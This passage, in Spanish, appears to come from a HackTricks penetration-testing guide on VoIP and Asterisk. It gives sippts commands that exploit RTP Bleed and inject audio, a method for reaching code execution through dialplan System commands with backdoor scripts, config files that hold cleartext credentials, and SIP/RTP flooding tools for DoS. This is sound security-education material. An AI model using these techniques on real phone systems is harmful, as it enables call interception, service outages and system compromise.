* **`SIPPTS rtpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed detecta la vulnerabilidad de RTP Bleed enviando flujos de RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed detecta la vulnerabilidad de RTP Bleed enviando flujos de RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood explota la vulnerabilidad de RTP Bleed enviando flujos de RTP
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject explota la vulnerabilidad de RTP Bleed enviando flujos de RTP (desde un archivo de audio)
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

En Asterisk, si de alguna manera logras **agregar reglas de extensi√≥n y recargarlas** (por ejemplo, comprometiendo un servidor de administraci√≥n web vulnerable), es posible obtener RCE utilizando el comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Existe un comando llamado **`Shell`** que se puede usar **en lugar de `System`** para ejecutar comandos del sistema si es necesario.

{% hint style="warning" %}
Si el servidor est√° **prohibiendo el uso de ciertos caracteres** en el comando **`System`** (como en Elastix), verifica si el servidor web permite **crear archivos de alguna manera dentro del sistema** (como en Elastix o trixbox), y √∫salo para **crear un script de puerta trasera** y luego usa **`System`** para **ejecutar** ese **script**.
{% endhint %}

#### Archivos locales interesantes y permisos

* **`sip.conf`** -> Contiene la contrase√±a de los usuarios SIP.
* Si el **servidor Asterisk se est√° ejecutando como root**, podr√≠as comprometer el root.
* El **usuario root de mysql** podr√≠a **no tener contrase√±a**.
* Esto podr√≠a usarse para crear un nuevo usuario de mysql como puerta trasera.
* **`FreePBX`**
* **`amportal.conf`** -> Contiene la contrase√±a del administrador del panel web (FreePBX).
* **`FreePBX.conf`** -> Contiene la contrase√±a del usuario FreePBXuser utilizado para acceder a la base de datos.
* Esto podr√≠a usarse para crear un nuevo usuario de mysql como puerta trasera.
* **`Elastix`**
* **`Elastix.conf`** -> Contiene varias contrase√±as en texto claro como la contrase√±a de root de mysql, la contrase√±a de IMAPd, la contrase√±a de administrador web.
* **Varias carpetas** pertenecer√°n al usuario de Asterisk comprometido (si no se est√° ejecutando como root). Este usuario puede leer los archivos anteriores y tambi√©n controla la configuraci√≥n, por lo que podr√≠a hacer que Asterisk cargue otros binarios con puertas traseras cuando se ejecuten.

### Inyecci√≥n de RTP

Es posible insertar un **`.wav`** en conversaciones usando herramientas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) y **`rtpmixsound`** (`sudo apt install rtpmixsound`).

O podr√≠as usar los scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversaciones** (**`rtpscan.pl`**), enviar un `.wav` a una conversaci√≥n (**`rtpsend.pl`**) e **insertar ruido** en una conversaci√≥n (**`rtpflood.pl`**).

### DoS

Existen varias formas de intentar lograr un DoS en servidores VoIP.

* **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood env√≠a mensajes ilimitados al objetivo.
  * `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping env√≠a un SIP ping para ver el tiempo de respuesta del servidor.
  * `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS al protocolo IAX utilizado por Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Una herramienta para realizar inundaciones de mensajes SIP/SDP INVITE sobre UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Env√≠a varios paquetes RTP bien formados. Es necesario conocer los puertos RTP que se est√°n utilizando (primero sniff).
* [**SIPp**](https://github.com/SIPp/sipp): Permite analizar y generar tr√°fico SIP, por lo que tambi√©n se puede usar para DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Navaja suiza SIP. Tambi√©n se puede usar para realizar ataques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnerabilidades del sistema operativo

La forma m√°s sencilla de instalar un software como Asterisk es descargar una **distribuci√≥n de SO** que ya lo tenga instalado, como: **FreePBX, Elastix, Trixbox**... El problema con estos es que una vez que est√©n funcionando, los administradores del sistema podr√≠an **no actualizarlos nuevamente** y con el tiempo se descubrir√°n **vulnerabilidades**.

## Referencias

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¬°consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
